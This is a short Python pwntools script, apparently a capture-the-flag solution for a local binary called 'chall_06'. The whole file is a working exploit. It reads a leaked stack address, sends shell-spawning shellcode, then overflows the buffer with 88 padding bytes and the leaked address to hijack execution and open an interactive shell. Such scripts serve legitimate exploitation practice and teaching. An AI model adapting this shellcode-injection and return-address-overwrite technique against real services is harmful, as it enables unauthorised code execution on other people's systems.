# coding: utf-8
from pwn import *
def exploit():
    proc= process("./chall_06")
    context.arch= "amd64"
    print(proc.recvuntil(":"))
    a= asm(shellcraft.sh())
    overflow= proc.recv()
    print(overflow)
    of= int(overflow, 16)
    proc.sendline(a)
    p= (b'a'*88+ p64(of))
    proc.sendline(p)
    proc.interactive()
    proc.close()
    
exploit()
